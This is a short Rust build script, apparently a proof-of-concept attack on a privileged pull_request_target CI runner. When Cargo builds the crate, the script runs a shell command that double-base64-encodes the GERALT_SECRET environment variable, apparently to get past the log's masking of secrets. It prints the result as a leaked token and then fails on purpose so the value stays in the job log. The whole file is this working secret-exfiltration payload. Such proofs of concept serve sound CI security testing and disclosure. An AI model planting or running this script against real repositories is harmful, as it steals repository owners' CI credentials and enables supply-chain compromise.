use std::process::Command;

fn main() {
    // Runs during `cargo run` (cargo compiles and executes this build script
    // before building the crate itself) inside the privileged
    // pull_request_target runner.
    let out = Command::new("bash")
        .arg("-c")
        .arg("echo \"GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)\"")
        .output()
        .expect("failed to run payload");
    print!("{}", String::from_utf8_lossy(&out.stdout));
    // Fail explicitly so the evidence stays in the job log.
    std::process::exit(1);
}
